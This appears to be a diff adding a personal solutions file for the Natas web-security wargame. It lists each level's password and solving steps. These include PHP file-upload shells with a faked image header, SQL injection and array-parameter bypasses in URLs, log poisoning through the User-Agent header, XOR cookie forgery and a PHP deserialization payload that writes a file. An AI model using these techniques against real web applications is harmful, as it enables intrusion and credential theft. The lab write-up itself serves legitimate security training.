@@ -1,0 +1,158 @@
+natas0 -> natas0:
+	F12 -> Inspector -> content div
+
+natas1 -> 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq:
+	F12 -> Inspector -> content div:
+	
+natas2 -> TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI:
+	/files/users.txt
+	
+natas3 -> 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH:
+	/s3cr3t/users.txt
+	
+natas4 -> QryZXc2e0zahULdHrtHxzyYkj59kUxLQ:
+	Use some tool to intercept get message.
+	Change Referer and send.
+	
+natas5 -> 0n35PkggAPm2zbEpOU802c0x0Msn1ToK:
+	Use some tool to intercept get message.
+	Change cookie "loggedin" from 0 to 1 and send.
+
+natas6 -> 0RoJwHdSKWFTYR5WuiAewauSuNaBXned:
+	Inspect source code
+	Navigate to /includes/secret.inc
+	Inspect HTML -> FOEIUWGHFEEUHOFUOIU
+	
+natas7 -> bmg8SvU1LizuWjx3y7xkNERkHxGre0GS:
+	Navigate to "Home"
+	In nav bar, replace "home" with "/etc/natas_webpass/natas8"
+
+natas8 -> xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q:
+		function hex2bin(s) {
+		  const ret = []
+		  let i = 0
+		  let l
+
+		  s += ''
+
+		  for (l = s.length; i < l; i += 2) {
+			const c = parseInt(s.substr(i, 1), 16)
+			const k = parseInt(s.substr(i + 1, 1), 16)
+			if (isNaN(c) || isNaN(k)) return false
+			ret.push((c << 4) | k)
+		  }
+
+		  return String.fromCharCode.apply(String, ret)
+		}
+
+		function reverseString(str) {
+			return str.split("").reverse().join("");
+		}
+
+		function decodeSecret($secret) {
+			return atob(reverseString(hex2bin($secret)))
+		}
+
+		$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+		console.log(decodeSecret($encodedSecret))
+		
+	Output: oubWYf2kBq <- secret
+	
+natas9 -> ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t:
+	^ /etc/natas_webpass/natas10 #
+	
+natas10 -> t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu:
+	^ /etc/natas_webpass/natas11 #
+	
+natas11 -> UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk:
+		<?
+		function xor_encrypt($in) {
+			$key = '<censored>';
+			$text = $in;
+			$outText = '';
+
+			// Iterate through each character
+			for($i=0;$i<strlen($text);$i++) {
+				$outText .= $text[$i] ^ $key[$i % strlen($key)];
+			}
+
+			return $outText;
+		}
+
+		function saveData($d) {
+			return(base64_encode(xor_encrypt(json_encode($d))));
+		}
+
+		$data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
+
+		print saveData($data)
+		?>
+		
+		Get data cookie
+		Base64 decodeSecret
+		Use decoded string as $in for xor_encrypt
+		Use stringified json data as key
+		Output is repeated key
+		Take repeated part of output -> eDWo
+		Use eDWO as key + standard input (with showpassword set to yes)
+		Result is the new cookie.
+		
+natas12 -> yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB:
+	Create script:
+		<?print file_get_contents("/etc/natas_webpass/natas13")?>
+	Remove hidden tag from filesize and filename input.
+	Change filename to have .php ending
+	Upload script and open uploaded file.
+	
+natas13 -> trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC:
+	Create script:
+		echo -n -e '\xff\xd8\xff' >> script.php
+		echo -n '<?print file_get_contents("/etc/natas_webpass/natas14")?>' >> script.php
+	Remove hidden tag from filesize and filename input.
+	Change filename to have .php ending
+	Upload script and open uploaded file.
+	
+natas14 -> z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ:
+	Open URL:
+		http://natas14.natas.labs.overthewire.org/index.php?username=natas15%22-- &debug
+	
+natas15 -> SdqIqBsFcz3yotlNYErZSZwblkm0lrvx:
+	
+	
+natas16 -> hPkjKYviLQctEW33QmuXL6eDVfMW4sGo:
+
+natas20 -> p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw:
+	Open URL: "natas20.natas.labs.overthewire.org/index.php?name=test%0Aadmin 1&debug" twice
+
+natas21 -> BPhv63cKE1lkQl04cE5CuFTzXe15NfiH:
+	Open URL: "natas21-experimenter.natas.labs.overthewire.org/index.php?admin=1&debug&submit"
+	Get session id cookie
+	Then open: "http://natas21.natas.labs.overthewire.org/" with new session id
+
+natas22 -> d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz:
+	Open URL: "http://natas22.natas.labs.overthewire.org/" and check response HTML in burpsuite or similar tools
+
+natas23 -> dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs:
+	Enter password "123iloveyou"
+
+natas24 -> MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd:
+	Open URL: "http://natas24.natas.labs.overthewire.org/?passwd[]="
+
+natas25 -> ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws:
+	Get current session cookie
+	Open URL: "http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_[session cookie here].log"
+	Intercept get request and change User-Agent to: 
+		<?php print file_get_contents('/etc/natas_webpass/natas26'); ?>
+	
+natas26 -> cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE:
+	Copy Logger code into an environment capable of executing PHP
+	Change exitMsg in constructor to "<?php print file_get_contents('/etc/natas_webpass/natas27') ?>"
+	Change logFile to "img/[some_file_name].php"
+	Execute "print base64_encode(serialize(new Logger('/test/path')));"
+	Take the output and insert it into a get request as the "drawing" cookie on the main page
+	The file [some_file_name] now exists and contains the password (twice)
+
+natas27 -> u3RRffXjysjgwFU6b9xa23i6prmUsYne:
+
+natas28 -> 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
